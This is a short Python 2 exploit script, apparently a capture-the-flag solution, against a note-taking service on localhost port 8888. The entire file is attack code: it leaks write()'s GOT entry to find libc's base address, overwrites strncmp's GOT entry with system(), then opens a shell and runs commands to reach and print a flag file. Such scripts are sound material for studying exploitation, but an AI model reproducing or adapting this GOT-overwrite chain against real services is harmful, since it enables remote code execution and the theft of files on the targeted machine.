#!/usr/bin/env python

import socket, struct, re, time

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('localhost', 8888))

def W(x):
  sc.send(x)
  time.sleep(0.3)

def R():
  return sc.recv(40960)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]

write_offset = 0xd9da0
write_plt = 0x08048680
write_got = 0x0804b048
strncmp_got = 0x804b054 

R()
W('punish\n')
R()
W('8\n')

R()
W('note\n')
R()
W('9\n')
R()
W('36\n')
R()
W(PI(0)*6+PI(4)+PI(write_got)+PI(0))

R()
W('list\n')
l = R()
libc_base = UI(l[-8:-4]) - write_offset

print "libc_base: " + hex(libc_base)

system_offset = 0x0003fc40
system_libc = system_offset + libc_base

W('note\n')
R()
W('9\n')
R()
W('36\n')
R()
W(PI(0)*4+PI(8)+PI(0)+PI(36)+PI(strncmp_got)+PI(0))

print "system_libc: ", hex(system_libc)
R()
W('note\n')
R()
W('8\n')
R()
W('36\n')
R()
W(PI(system_libc))
R()

W('/*/sh\n')
W('cd h*\n')
W('cd p*\n')
W('cat f*\n')
W('ls -al\n')

print R()


